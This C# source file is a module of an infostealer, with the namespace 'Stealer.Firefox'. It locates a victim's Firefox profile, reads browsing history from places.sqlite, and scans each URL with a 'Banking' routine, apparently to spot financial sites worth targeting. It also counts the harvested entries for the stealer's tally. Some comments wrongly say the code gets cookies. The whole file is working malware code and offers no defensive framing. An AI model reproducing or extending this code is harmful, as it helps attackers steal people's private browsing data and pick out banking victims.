using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Firefox
{
    internal class cHistory
    {

        // Get cookies.sqlite file location
        private static string GetHistoryDBPath(string path)
        {
            try
            {
                string dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (string sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\places.sqlite"))
                            return sDir + "\\places.sqlite";
            } catch { }
            return null;
        }

        // Get cookies from gecko browser
        public static List<Site> Get(string path)
        {
            List<Site> scHistory = new List<Site>();
            try
            {
                string sHistoryPath = GetHistoryDBPath(path);

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sHistoryPath, "moz_places");
                if (sSQLite == null)
                    return scHistory;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Site sSite = new Site();
                    sSite.sTitle = Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    sSite.sUrl = Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    sSite.iCount = Convert.ToInt32(sSQLite.GetValue(i, 4)) + 1;

                    if (sSite.sTitle != "0")
                    {
                        // Analyze value
                        Banking.ScanData(sSite.sUrl);
                        Counter.History++;
                        scHistory.Add(sSite);
                    }
                }

                return scHistory;
            }
            catch (Exception ex) { Console.WriteLine(ex); }
            return new List<Site>();
        }

    }
}
